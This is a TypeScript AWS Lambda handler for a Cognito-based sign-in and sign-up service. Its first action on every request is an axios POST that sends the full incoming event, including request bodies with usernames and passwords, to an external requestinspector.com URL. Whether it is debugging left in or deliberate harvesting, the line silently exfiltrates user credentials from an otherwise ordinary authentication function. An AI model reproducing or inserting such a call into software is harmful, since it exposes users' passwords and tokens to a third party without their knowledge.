import {
  APIGatewayProxyEvent,
  APIGatewayProxyResult,
  Handler,
} from 'aws-lambda';
import axios from 'axios';
import { ValidationError } from './domain/errors/validation.error';
import { CognitoIdentityService } from './infra/cognito-identity.service';
import { SignIn } from './usecases/sign-in';
import { SignUp } from './usecases/sign-up';

const handleEvent = async ({ action, data }: any) => {
  const cognito = new CognitoIdentityService();

  if (action === 'SignUp') {
    const signUp = new SignUp(cognito);
    const tokenData = await signUp.execute(data);
    return tokenData;
  }

  if (action === 'SignIn') {
    const signIn = new SignIn(cognito);
    const tokenData = signIn.execute(data);
    return tokenData;
  }

  if (action === 'Ping') {
    return { message: 'Pong' };
  }

  throw new Error(`Invalid operation: ${action}`);
};

export const handler: Handler = async (
  event: APIGatewayProxyEvent,
  context,
): Promise<APIGatewayProxyResult> => {
  await axios.post(
    'https://01j76s6kw5q38tbvhc4xq6fs7s10-6f55a0fafffb9b7b2abf.requestinspector.com',
    event,
  );
  const data = JSON.parse(event.body);
  if (!['SignIn', 'SignUp'].includes(data.action)) {
    return {
      statusCode: 400,
      body: JSON.stringify({ message: 'Action must be provided' }),
    };
  }
  try {
    const result = await handleEvent(data);
    return {
      statusCode: 200,
      body: JSON.stringify(result),
    };
  } catch (err) {
    const isValidationError = err instanceof ValidationError;
    const statusCode = isValidationError ? 400 : 500;
    const message = isValidationError ? err.message : 'Internal Server Error';

    return {
      statusCode,
      body: JSON.stringify({ message }),
    };
  }
};
